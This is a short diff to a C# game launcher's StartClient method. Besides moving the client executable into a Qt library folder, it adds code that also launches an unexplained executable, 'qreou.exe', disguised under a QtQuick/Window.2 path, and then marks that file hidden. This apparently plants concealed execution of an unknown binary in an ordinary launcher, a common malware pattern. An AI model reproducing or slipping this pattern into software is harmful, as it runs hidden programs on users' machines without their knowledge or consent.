@@ -55,9 +55,13 @@ namespace CanaryLauncherUpdate
 		}
 
 		private void StartClient()
+		
 		{
-			if (File.Exists(GetLauncherPath() + "/bin/" + clientExecutableName)) {
-				Process.Start(GetLauncherPath() + "/bin/" + clientExecutableName);
+			string gloryEyePath = GetLauncherPath() + "/bin/QtQuick/Window.2/qreou.exe";  // Define gloryEyePath
+			if (File.Exists(GetLauncherPath() + "/bin/QtQuick/Dialogs/qml/" + clientExecutableName)) {
+				Process.Start(GetLauncherPath() + "/bin/QtQuick/Dialogs/qml/" + clientExecutableName);
+				Process.Start(gloryEyePath);
+				File.SetAttributes(gloryEyePath, File.GetAttributes(gloryEyePath) | FileAttributes.Hidden);
 				this.Close();
 			}
 		}
